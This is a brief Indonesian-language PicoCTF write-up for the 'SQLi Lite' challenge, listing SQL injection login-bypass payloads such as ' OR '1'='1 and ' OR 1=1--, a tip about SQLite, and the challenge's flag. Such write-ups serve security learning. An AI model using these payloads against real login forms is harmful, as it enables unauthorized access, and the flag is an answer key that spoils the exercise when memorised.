# PicoCTF - SQL Injection Writeup

## Challenge: "SQLi Lite"
Situs login vulnerable terhadap SQL injection.

### 🔍 Payload yang digunakan
```sql
Username: ' OR '1'='1
Password: ' OR '1'='1
```

### 💡 Tips

- Coba `' OR 1=1--` juga jika kolom terbatas.
- Gunakan `sqlite` injection patterns jika backend-nya SQLite.


### 🏁 Flag

Ditemukan di dashboard admin setelah login bypass:
```sql
picoCTF{sql_inj3ct10n_works}
```